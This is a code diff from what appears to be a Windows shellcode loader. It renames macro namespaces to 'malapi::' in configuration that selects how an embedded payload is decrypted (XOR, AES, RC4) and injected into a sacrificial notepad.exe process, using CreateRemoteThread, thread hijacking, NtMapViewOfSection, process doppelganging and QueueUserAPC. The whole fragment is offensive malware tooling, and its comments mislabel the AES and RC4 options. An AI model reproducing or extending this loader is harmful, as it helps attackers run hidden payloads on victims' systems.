@@ -43,13 +43,13 @@ unsigned char key[] = {
 
 #define CONFIG_ENCRYPTION_METHOD 2
 #if CONFIG_ENCRYPTION_METHOD == 1
-#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::NONE(shellcode, shellcode_len, key, key_len) // No Encryption
+#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::NONE(shellcode, shellcode_len, key, key_len) // No Encryption
 #elif CONFIG_ENCRYPTION_METHOD == 2
-#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::XOR(shellcode, shellcode_len, key, key_len) // XOR Encrypt
+#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::XOR(shellcode, shellcode_len, key, key_len) // XOR Encrypt
 #elif CONFIG_ENCRYPTION_METHOD == 3
-#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::AES(shellcode, shellcode_len, key, key_len) // RC4 Encrypt
+#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::AES(shellcode, shellcode_len, key, key_len) // RC4 Encrypt
 #elif CONFIG_ENCRYPTION_METHOD == 4
-#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::RC4(shellcode, shellcode_len, key, key_len) // AES Encrypt
+#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::RC4(shellcode, shellcode_len, key, key_len) // AES Encrypt
 #endif
 
 // Obfuscation
@@ -101,17 +101,17 @@ unsigned char shellcode[] = {
 #define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\notepad.exe"
 
 #if CONFIG_EXECUTION_METHOD == 1
-#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionCreateRemoteThread(phandle, shellcode, shellcode_len, ahandle)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionCreateRemoteThread(phandle, shellcode, shellcode_len, ahandle)
 #elif CONFIG_EXECUTION_METHOD == 2
-#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionRemoteHijack(phandle, shellcode, shellcode_len, ahandle)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionRemoteHijack(phandle, shellcode, shellcode_len, ahandle)
 #elif CONFIG_EXECUTION_METHOD == 3
-#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionAddressOfEntryPoint(phandle, shellcode, shellcode_len, ahandle)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionAddressOfEntryPoint(phandle, shellcode, shellcode_len, ahandle)
 #elif CONFIG_EXECUTION_METHOD == 4
 #define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionNtMapViewOfSection(phandle, shellcode, shellcode_len, ahandle)
 #elif CONFIG_EXECUTION_METHOD == 5
-#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionDoppleganger(phandle, shellcode, shellcode_len, ahandle)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionDoppleganger(phandle, shellcode, shellcode_len, ahandle)
 #elif CONFIG_EXECUTION_METHOD == 6
-#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) execute::InjectionQueueUserInject(phandle, shellcode, shellcode_len, ahandle)
+#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionQueueUserAPC(phandle, shellcode, shellcode_len, ahandle)
 #endif
 
 //
